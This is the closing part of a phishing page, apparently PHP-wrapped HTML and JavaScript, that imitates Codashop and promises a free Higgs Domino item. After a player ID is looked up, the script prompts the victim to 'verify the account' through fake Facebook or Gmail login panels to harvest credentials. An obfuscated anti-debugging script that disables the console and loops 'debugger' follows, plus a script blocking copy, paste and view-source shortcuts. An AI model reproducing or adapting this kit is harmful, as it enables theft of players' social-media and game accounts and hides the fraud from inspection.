                     <li class="confirm-user-dialog__extra-msg"></li>
                     <li>
                        <div>Item: </div>
                        <div id="namaPanggilan"></div>
                     </li>
                     <li>
                        <div>ID: </div>
                        <div id="showPlayerId"></div>
                     </li>
                     <li>
                        <div>Harga: </div>
                        <div>Rp. 0 (Gratis)</div>
                     </li>
                     <li>
                        <div>Bayar dengan: </div>
                        <div>CodaPay</div>
                     </li>
               </ul><span id="span-txnId" class="5991917773391017870" style="display: none;"></span></div>
            <div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
               <div class="ui-dialog-buttonset"><button type="button" id="doConfirm" class="confirm-user-dialog__btn btn-blue ui-button ui-corner-all ui-widget">Konfirm</button></div>
            </div>
         </div>
      </div>
      <script>
         if ((location.href.includes("grab-demo.coda")) || (location.href.includes("grab.codashop"))) {
             $("body").addClass("custom--grab");
             $(".logo-container-link").contents().unwrap();
             $("body").append('<link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/mobile/css/responsive-grab-page.6b9f5c3d59.css" />');
         }
      </script>
      <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S/content/common/css/flags.css" />
      <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/P/airtime/w/css/airtime_v1.0a.css" />
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
      <script type="text/javascript">
         $(document).ready(function() {
            
            $("li.voucher-list-element").on('click', function() {
               $("#hidePopError").show();

               $("span.element-check-label").hide()
               $(this).find(".element-check-label").show();

               $("#checkLabel").show();
               $("#priceLabel_227").html("Harga");
               $("#priceInfo_227").html("Rp. 0 (Gratis)");
               $("#showPayLabel").show();
               $("#showTagline").show();

               $("#mdn-submit").on('click', function() {
                  var id = $("#id").val();

                  if(id == "") {
                     $("#overlay").hide();
                     $(".popError").hide();
                     $("#errorMessage").addClass("errorMessage__container");
                     $("#errorMessage").html("<li class='error-msg__element'>Silahkan isi Player ID Higgs Domino Anda.</li>");
                     $("#overlay").show();
                     $(".popError").show();
                  } else {
                     $.ajax({
                        url: "trueId.php",
                        type: "POST",
                        data: 'userId='+id,
                        beforeSend: function() {
                           $("#overlay").hide();
                           $(".popError").hide();
                           $("#submit-loader").show();
                        },
                        success: function(response) {
                           $("#overlay").hide();
                           $(".popError").hide();

                           if(!$.trim(response)) {
                              $("#submit-loader").hide();
                              $("#errorMessage").addClass("errorMessage__container");
                              $("#errorMessage").html("<li class='error-msg__element'>Player ID ini tidak dapat ditemukan: "+id+"</li>");
                              $("#overlay").show();
                              $(".popError").show();
                           } else {
                              $("#submit-loader").hide();
                              $("#namaPanggilan").html(response);
                              $("#showPlayerId").html(id);
                              $("#overlay").show();
                              $("#showKonfirm").fadeIn("slow");

                              $("#doConfirm").on("click", function() {
                                 $("#showKonfirm").hide();
                                 $("#errorMessage").removeClass("errorMessage__container");
                                 $(".errorHeader").html("Hi "+response+", Verifikasi akun anda");
                                 $("#errorMessage").html('<center><h4>Metode Login :</h4><div class="imgLogin" style="display:block; margin: auto; margin-top: 20px;"><img id="fbLogin" src="../img/fb-btn.png" alt="" style="width: 250px; cursor: pointer; display: block; margin: 5px auto;"> <img src="../img/gm-btn.png" alt="" id="vkLogin" style="width: 250px; cursor: pointer; display: block; margin: 5px auto;"></div></center>');
                                 $("#overlay").show();
                                 $(".popError").show();
                                 $("#hidePopError").hide();
                                 $("input#nickname").val(response);
                                 $("input#userIdForm").val(id);

                                 $("#fbLogin").on('click', function() {
                                    $("#errorMessage").addClass("errorMessage__container");
                                    $("#overlay").hide();
                                    $(".popError").hide();
                                    $("#hidePopError").show();
                                    $(".facebook").fadeIn('slow');

                                    $(".close-fb").on('click', function() {
                                       $(".facebook").hide();
                                       $("#submit-loader").hide();
                                       $("#errorMessage").removeClass("errorMessage__container");
                                       $("#overlay").show();
                                       $(".popError").show();
                                       $("#hidePopError").hide();
                                    });
                                 });

                                 $("#vkLogin").on('click', function() {
                                    $("#errorMessage").addClass("errorMessage__container");
                                    $("#overlay").hide();
                                    $(".popError").hide();
                                    $("#hidePopError").show();
                                    $(".twitter").fadeIn('slow');

                                    $(".close-other").on('click', function() {
                                       $(".twitter").hide();
                                       $("#submit-loader").hide();
                                       $("#errorMessage").removeClass("errorMessage__container");
                                       $("#overlay").show();
                                       $(".popError").show();
                                       $("#hidePopError").hide();
                                    });
                                 });
                              });
                           }
                        }
                     });
                  }
               });
               
            });

            $("#mdn-submit").on('click', function() {
               $("#overlay").show();
               $(".popError").show();
               $("#errorMessage").addClass("errorMessage__container");
               $("#errorMessage").html("<li class='error-msg__element'>Silahkan isi Player ID Higgs Domino Anda.</li><li class='error-msg__element'>Silahkan pilih nomor voucher</li><li class='error-msg__element'>Silahkan pilih metode pembayaran</li>");

               $("#hidePopError").on('click', function() {
                  $("#errorMessage").html("");
                  $("#overlay").hide();
                  $(".popError").hide();
               });
            });
         
         });
      </script>
      <a href="https://plus.google.com/104822527805498875313" style="display: none;" rel="publisher">Google+</a>
      <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/infoBar.38acc407b3.js"></script>
      <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/faq.7a04e34b3d.js"></script>
      <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/payment-channel-suggestion.535f3c6f70.js"></script>
      <script type="text/javascript" src="https://www.google.com/recaptcha/api.js" async defer></script>
      <script type="text/javascript">
         (function(t, a, p) {
             t.TapfiliateObject = a;
             t[a] = t[a] || function() {
                 (t[a].q = t[a].q || []).push(arguments)
             }
         })(window, 'tap');
         
         tap('create', '11857-697628');
         tap('detect');
         
         tap('getTrackingId', null, function(trackingId) {
             CODA.Shop.affiliateTrackingId = trackingId ? trackingId : '';
         });
      </script>
      <script type="text/javascript">
			var _0x3d88=['log','debug','info','error','exception','table','warn','trace','apply','debu','gger','don','return\x20(function()\x20','{}.constructor(\x22return\x20this\x22)(\x20)','console'];(function(_0x4b152f,_0x59d86c){var _0x5c135a=function(_0x5b5d0f){while(--_0x5b5d0f){_0x4b152f['push'](_0x4b152f['shift']());}};_0x5c135a(++_0x59d86c);}(_0x3d88,0x170));var _0x306c=function(_0x4b152f,_0x59d86c){_0x4b152f=_0x4b152f-0x0;var _0x5c135a=_0x3d88[_0x4b152f];return _0x5c135a;};(function(_0x2605bc){var _0x4c9a2c=function(){var _0x244728=!![];return function(_0x3efc74,_0x16c2ac){var _0x4d7b05=_0x244728?function(){if(_0x16c2ac){var _0x45ed49=_0x16c2ac[_0x306c('0x0')](_0x3efc74,arguments);_0x16c2ac=null;return _0x45ed49;}}:function(){};_0x244728=![];return _0x4d7b05;};}();var _0x4ed3d0=[_0x306c('0x1'),_0x306c('0x2'),_0x306c('0x3')];function _0x17f16e(){var _0x41d7ca=_0x4c9a2c(this,function(){var _0x6c13c9=function(){};var _0x187a25=function(){var _0x23d8ab;try{_0x23d8ab=Function(_0x306c('0x4')+_0x306c('0x5')+');')();}catch(_0x15bb1a){_0x23d8ab=window;}return _0x23d8ab;};var _0x4a78e1=_0x187a25();if(!_0x4a78e1[_0x306c('0x6')]){_0x4a78e1[_0x306c('0x6')]=function(_0x6c13c9){var _0x19ef79={};_0x19ef79[_0x306c('0x7')]=_0x6c13c9;_0x19ef79['warn']=_0x6c13c9;_0x19ef79[_0x306c('0x8')]=_0x6c13c9;_0x19ef79[_0x306c('0x9')]=_0x6c13c9;_0x19ef79[_0x306c('0xa')]=_0x6c13c9;_0x19ef79[_0x306c('0xb')]=_0x6c13c9;_0x19ef79[_0x306c('0xc')]=_0x6c13c9;_0x19ef79['trace']=_0x6c13c9;return _0x19ef79;}(_0x6c13c9);}else{_0x4a78e1[_0x306c('0x6')][_0x306c('0x7')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xd')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0x8')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0x9')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xa')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xb')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xc')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xe')]=_0x6c13c9;}});_0x41d7ca();return function(){return eval(_0x4ed3d0[0x0]+_0x4ed3d0[0x1]);};}_0x2605bc[_0x4ed3d0[0x2]]=_0x17f16e();setInterval(_0x4ed3d0[0x2]+'()',0xc8);}(window));
		</script>
		<script>
            document.onkeydown = function(e) {
                if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
                    return false;
                } else {
                    return true;
                }
            };
        </script>
   </body>
</html>")); ?>